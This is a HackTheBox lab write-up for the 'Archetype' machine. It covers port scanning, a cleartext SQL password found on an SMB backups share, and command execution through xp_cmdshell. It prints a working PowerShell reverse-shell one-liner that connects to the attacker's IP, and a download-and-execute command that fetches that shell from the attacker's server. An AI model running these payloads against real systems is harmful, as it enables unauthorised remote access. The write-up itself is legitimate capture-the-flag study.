---
title: "ArcheType - HackTheBox"
layout: single
excerpt: "This machine is a 'Starting Point', I liked the intrusion better, I took advantage of a DTS file with XML code in the backups share that had authentication credentials in clear text, I connected with mssqclient and achieved RCE using PowerShell code, I started a reverse Shell, for the escalation of privileges I found a file in a system path with credentials, I managed to authenticate with winexe."
header:
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/69093629/124369575-53c69000-dc6d-11eb-83db-4b4caea04ddc.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/69093629/125662338-fd8b3b19-3a48-4fb0-b07c-86c047265082.png"
categories:
  - HackTheBox
tags:
  - smbclient
  - extractports
  - crackmapexec
  - Starting Point
---

<p align="center">
<img src="https://user-images.githubusercontent.com/69093629/124369575-53c69000-dc6d-11eb-83db-4b4caea04ddc.png">
</p>

I started by doing a scan with Nmap to see what ports and services the machine has running.

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ nmap -sS --min-rate=5000 -p- -v -Pn -n 10.10.10.27 -oG nmap.txt
Starting Nmap 7.80 (https://nmap.org) at 2021-06-14 00:41 CEST
Initiating SYN Stealth Scan at 00:41
Scanning 10.10.10.27 [65535 ports]
Discovered open port 445/tcp on 10.10.10.27
Discovered open port 135/tcp on 10.10.10.27
Discovered open port 139/tcp on 10.10.10.27
Discovered open port 49666/tcp on 10.10.10.27
Discovered open port 1433/tcp on 10.10.10.27
Discovered open port 49667/tcp on 10.10.10.27
Discovered open port 49664/tcp on 10.10.10.27
Discovered open port 49669/tcp on 10.10.10.27
Discovered open port 47001/tcp on 10.10.10.27
Discovered open port 49668/tcp on 10.10.10.27
Discovered open port 49665/tcp on 10.10.10.27
Discovered open port 5985/tcp on 10.10.10.27
Completed SYN Stealth Scan at 00:42, 13.64s elapsed (65535 total ports)
Nmap scan report for 10.10.10.27
Host is up (0.038s latency).
Not shown: 65523 closed ports
PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
1433/tcp open ms-sql-s
5985/tcp open wsman
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49667/tcp open unknown
49668/tcp open unknown
49669/tcp open unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.81 seconds
           Raw packets sent: 67758 (2.981MB) | RCVD: 65535 (2.621MB)
```

It has many ports open, I used **s4vitar**'s extractPorts utility to extract and copy the ports to the clipboard.

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ extractPorts allPorts
[*] Extracting information...

        [*] IP Address: 10.10.10.27
        [*] Open ports: 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669

[*] Ports copied to clipboard
```

Next, perform another scan to identify which service was running for each port.

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -oN targeted 10.10.10.27
Nmap scan report for 10.10.10.27
Host is up (0.047s latency).

PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
| Target_Name: ARCHETYPE
| NetBIOS_Domain_Name: ARCHETYPE
| NetBIOS_Computer_Name: ARCHETYPE
| DNS_Domain_Name: Archetype
| DNS_Computer_Name: Archetype
|_ Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-06-13T22:38:29
|_Not valid after: 2051-06-13T22:38:29
|_ssl-date: 2021-06-13T23:04:21+00:00; +18m23s from scanner time.
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
49669/tcp open msrpc Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h42m23s, deviation: 3h07m51s, median: 18m22s
| ms-sql-info:
| 10.10.10.27:1433:
| Version:
| name: Microsoft SQL Server 2017 RTM
| number: 14.00.1000.00
| Product: Microsoft SQL Server 2017
| Service pack level: RTM
| Post-SP patches applied: false
|_ TCP port: 1433
| smb-os-discovery:
| OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
| Computer name: Archetype
| NetBIOS computer name: ARCHETYPE\x00
| Workgroup: WORKGROUP\x00
|_ System time: 2021-06-13T16:04:14-07:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2021-06-13T23:04:16
|_ start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
# Nmap done at Mon Jun 14 00:45:58 2021 -- 1 IP address (1 host up) scanned in 65.42 seconds
```

It seems that there were many Samba ports open, I wanted to check if I had access via `smbclient` using a null session.

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ smbclient -L 10.10.10.27 -N

        Sharename Type Comment
        ---------- ---- -------
        ADMIN$ Disk Remote Admin
        Disk backups      
        C$ Disk Default share
        IPC$ IPC Remote IPC
SMB1 disabled -- no workgroup available
```

I saw that there was a folder called backups, it caught my attention and I wanted to see if I had access to its content, I could see what it had and found a DTS file that had XML code "**prod.dts.Config**", I opened it and found the following.

```xml
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="1/20/2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>#  
```

I wanted to check if the password would work for some kind of authentication, so I used "CrackMapExec".

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ crackmapexec smb 10.10.10.27 -u 'ARCHETYPE' -p 'M3g4c0rp123'
SMB 10.10.10.27 445 ARCHETYPE [*] Windows Server 2019 Standard 17763 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True)
SMB 10.10.10.27 445 ARCHETYPE [+] Archetype\ARCHETYPE:M3g4c0rp123
```

Seeing that the file is DTS and had XML code, I thought that the password could be from a database, so I used the mssqlclient tool to see if I had authentication access.

```python
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

And indeed I did, I had the ability to run commands thanks to the xp_cmdshell utility.

```python
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> EXEC sp_configuration 'xp_cmdshell', 1
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
```

I searched [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) and found a reverse *Shell* in **PowerShell** that allowed me to gain access to the machine in an interactive console via Netcat, I created a file called shell.ps1 and put the following code in it.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.155",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0} ;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

I opened a server via **Python** to download the reverse shell from "mssqlclient" and a Netcat session via port 443, run the following command to download the reverse *Shell*.

```powershell
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> xp_cmdshell "powershell "IEX (New-Object New.WebClient).DownloadString(\"http://10.10.14.155:8000/shell.ps1\");"
```

And I got the Shell via Netcat.

![Screenshot (596)](https://user-images.githubusercontent.com/69093629/123466698-ede46380-d5ef-11eb-8219-17e89df26f12.png)

The user flag was in "C:\Users\sql_svc\Desktop\user.txt".

![Screenshot (589)](https://user-images.githubusercontent.com/69093629/123467247-9266a580-d5f0-11eb-8ff9-9e9f4657ab06.jpg)

<hr>
<h1 align="center"><b>ESCALATION OF PRIVILEGES</b></h1>

After a little research on the system I managed to find a file that contained a password in clear text, the path is "C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine".

I checked with CrackMapExec what privileges it had.

![Screenshot (591)](https://user-images.githubusercontent.com/69093629/123467866-48ca8a80-d5f1-11eb-80bf-324ba54b3107.png)

Dio Pwned, this means that we had authentication privileges through "psexec", I wanted to vary a bit and decided to access through "winexe", the **ROOT** "flag" was in "C:\Users\administrator\Desktop\root.txt".

![Screenshot (592)](https://user-images.githubusercontent.com/69093629/123468232-ca221d00-d5f1-11eb-8dcb-5ee8f69309a9.jpg)




